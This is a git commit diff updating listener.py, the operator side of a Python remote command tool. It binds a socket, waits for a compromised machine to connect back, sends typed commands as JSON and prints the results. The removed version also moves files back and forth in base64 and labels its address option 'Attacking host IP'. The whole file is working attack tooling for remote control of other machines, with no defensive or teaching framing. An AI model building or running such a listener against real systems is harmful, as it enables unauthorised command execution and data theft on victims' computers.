40e679948754610c179d0b6a6c0a47e3256edf6a
F7P-H4NN1B4L <101667659+F7P-H4NN1B4L@users.noreply.github.com>
2026-01-27 19:36:12 +0100

    Update listener.py

--- listener.py
+++ listener.py
@@ -1,125 +1,70 @@
 #!/usr/bin/python3
+"""
+Simple listener script
+Python 3.8+
+"""
+
 import optparse
 import base64
 import socket
 import json
-import os
-
-
-
-print(r"""FFFFFFFFFFFFFFFFFFFFFFTTTTTTTTTTTTTTTTTTTTTTTPPPPPPPPPPPPPPPPP   
-F::::::::::::::::::::FT:::::::::::::::::::::TP::::::::::::::::P  
-F::::::::::::::::::::FT:::::::::::::::::::::TP::::::PPPPPP:::::P 
-FF::::::FFFFFFFFF::::FT:::::TT:::::::TT:::::TPP:::::P     P:::::P
-  F:::::F       FFFFFFTTTTTT  T:::::T  TTTTTT  P::::P     P:::::P
-  F:::::F                     T:::::T          P::::P     P:::::P
-  F::::::FFFFFFFFFF           T:::::T          P::::PPPPPP:::::P 
-  F:::::::::::::::F           T:::::T          P:::::::::::::PP  
-  F:::::::::::::::F           T:::::T          P::::PPPPPPPPP    
-  F::::::FFFFFFFFFF           T:::::T          P::::P            
-  F:::::F                     T:::::T          P::::P            
-  F:::::F                     T:::::T          P::::P            
-FF:::::::FF                 TT:::::::TT      PP::::::PP          
-F::::::::FF                 T:::::::::T      P::::::::P          
-F::::::::FF                 T:::::::::T      P::::::::P          
-FFFFFFFFFFF                 TTTTTTTTTTT      PPPPPPPPPP""") 
-print()
-print()
-print()
-
-
-
-
-
-import requests
-import socket
-
-public_ip = requests.get("https://api.ipify.org").text
-print(f"[+] Public IP: {public_ip}")
-
-local_ip = socket.gethostbyname(socket.gethostname())
-print(f"[+] Local IP: {local_ip}")
-
-def get_arguments():
-"""Get user supplied arguments from terminal."""
-parser = optparse.OptionParser()
-
-
-
-
 
 
 def get_arguments():
+    """Get user supplied arguments from terminal."""
     parser = optparse.OptionParser()
-    parser.add_option('-l', '--local', dest='local_ip', help='Attacking host IP.')
-    parser.add_option('-p', '--port', dest='port', type="int", help='Port to connect to.')
+
+    parser.add_option('-l', '--local', dest='local_ip', help='Listener IP')
+    parser.add_option('-p', '--port', dest='port', type=int, help='Listener port')
+
     (options, arguments) = parser.parse_args()
     return options
+
 
 options = get_arguments()
 
 if not options.local_ip or not options.port:
-    print("[-] Please provide -l <IP> and -p <PORT>")
+    print("[-] Usage: python3 listener.py -l <IP> -p <PORT>")
     exit()
+
 
 class Listener:
     def __init__(self, local_ip, port):
-        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        listener.bind((local_ip, port))
-        listener.listen(0)
-        print('[+] Waiting for incoming connections...')
-        self.connection, address = listener.accept()
-        print(f'[+] Connection from {str(address)}.')
+        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.listener.bind((local_ip, port))
+        self.listener.listen(1)
+
+        print("[+] Listening on {}:{}".format(local_ip, port))
+        self.connection, address = self.listener.accept()
+        print("[+] Connection from {}".format(address))
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data.encode())
+        self.connection.sendall(json_data.encode())
 
     def reliable_receive(self):
-        json_data = b''
+        data = b""
         while True:
             try:
-                json_data += self.connection.recv(4096)
-                return json.loads(json_data.decode())
+                data += self.connection.recv(4096)
+                return json.loads(data.decode())
             except ValueError:
                 continue
 
-    def execute_remotely(self, command):
-        self.reliable_send({"cmd": command})
-
-        if command == 'exit':
-            self.connection.close()
-            exit()
-
-        return self.reliable_receive()
-
-    def write_file(self, path, contents):
-        with open(path, 'wb') as file:
-            file.write(base64.b64decode(contents))
-        return '[+] Download successful...'
-
-    def read_file(self, path):
-        with open(path, 'rb') as file:
-            return base64.b64encode(file.read()).decode()
-
     def run(self):
         while True:
-            command = input('>> ')
+            command = input(">> ")
 
-            if command.startswith('upload '):
-                file_path = command.split(' ')[1]
-                file_content = self.read_file(file_path)
-                command = f"upload {file_path} {file_content}"
+            self.reliable_send({"cmd": command})
 
-            result = self.execute_remotely(command)
+            if command == "exit":
+                self.connection.close()
+                break
 
-            if command.startswith('download ') and result.get("status") == "ok":
-                path = command.split(' ')[1]
-                self.write_file(path, result.get("data"))
-                print("[+] Download complete")
-            else:
-                print(result.get("output"))
+            result = self.reliable_receive()
+            print(result.get("output", ""))
 
-my_listener = Listener(options.local_ip, options.port)
-my_listener.run()
+
+listener = Listener(options.local_ip, options.port)
+listener.run()
